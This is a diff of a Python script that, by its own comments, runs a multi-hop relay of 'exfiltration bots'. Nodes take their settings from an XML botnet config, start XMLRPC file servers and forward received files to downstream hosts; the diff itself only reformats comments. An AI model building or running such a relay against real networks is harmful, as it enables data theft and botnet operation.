@@ -32,12 +32,10 @@ class RequestHandler(SimpleXMLRPCRequestHandler):
         except Exception as e:
             print(strftime('%H:%M:%S') + ' The XMLRPC server won\'t start:', e)
             sys.exit(1)
-        # Synchronization variable so we're not
-        # fighting with clients over files
+        # A synchronization variable so we're not fighting with clients over files
         # in the data directory
         self.lock = lock
-        # This method gives us a way to check
-        # connectivity for clients
+        # This method gives us a way to check connectivity for clients
         self.server.register_introspection_functions()
         self.server.register_function(self.server_receive_file, 'server_receive_file')
         if not os.path.exists(data_dir):
@@ -84,8 +82,7 @@ def get_next_hops(conn, seq_no):
     return next
 
 def create_men_db(conn):
-    ### Create a local SQLite3 database and table
-    # to hold data on exfiltration bots
+    ### Create a local SQLite3 database and table to hold data on exfiltration bots
     # Connection object comes from the caller
     c = conn.cursor()
     c.execute('drop table if exists men')
@@ -108,10 +105,8 @@ def forward_files(proxy, hops, files, lock):
     '''Send newly-arrived files to the closest available
     downstream server.
     '''
-    # First, try a 'comm-check' with our proxy. If we
-    # can't reach that server, we'll continue the comm-
-    # checks down the sequence until either a server
-    # answers or we run out of servers to try.
+    # First, try a 'comm-check' with our proxy. If we can't reach that server, we'll continue the comm-
+    # checks down the sequence until either a server answers or we run out of servers to try.
     hop = 0
     while hop < len(hops):
         print(strftime('%H:%M:%S') + ' Trying to forward my files to', proxy)
@@ -172,10 +167,8 @@ if __name__=='__main__':
     '''
     # Get my ip address
     my_ip = get_my_IP()
-    #myIP = '10.0.1.243'
     print(strftime('%H:%M:%S') + ' My IP is:', my_ip)
-    # We'll use just one db connection
-    # and pass it around, as needed
+    # We'll use just one db connection and pass it around, as needed
     conn = sql.connect(db)
     # Get the tree from the men.xml file
     tree = parseXML(xml_url)
@@ -191,8 +184,7 @@ if __name__=='__main__':
         print(strftime('%H:%M:%S') + ' No botnet info available from XML server for my node! Exiting...')
         sys.exit(1)
     my_port, my_seq_no = my_config
-    # At this point, we have all the info 
-    # needed to fire up an XMLRPC server
+    # At this point, we have all the info needed to fire up an XMLRPC server
     print(strftime('%H:%M:%S') + ' My port number is', my_port, 'and my sequence number is', my_seq_no)
     # We'll only start a server if my_seq_no > 0
     # We also only need a lock if we need a server
@@ -215,8 +207,9 @@ if __name__=='__main__':
                 
         except Exception as e:
             print(strftime('%H:%M:%S') + ' ERROR: Can\'t start XMLRPC server instance:', e)
-    # For all but the source node, the data_dir is created when the server instance is instantiated.
-    # This else block ensures that the data_dir exists at the source.
+    # For all but the source node, the data_dir is created when
+    # the server instance is instantiated. This else block ensures
+    # that the data_dir exists at the source.
     else:
         print(strftime('%H:%M:%S') + ' My sequence number is 0, so I\'m NOT creating an XMLRPC server' + '...')
         if not os.path.exists(data_dir):
@@ -228,13 +221,11 @@ if __name__=='__main__':
                                                                                                     
     # Now, who is our next hop? We need this to define which server
     # to connect our client to, if any...
-    #print(strftime('%H:%M:%S') + ' My sequence number is', my_seq_no)
     next_hops = get_next_hops(conn, my_seq_no)
     # If the return value is None, that should mean we're the last
     # hop, in which case we won't be creating a client.
     client = False
     if len(next_hops) > 0:
-        #print('The next hops are', next_hops)
         client = True
         tries = hop = 0
         proxy = None
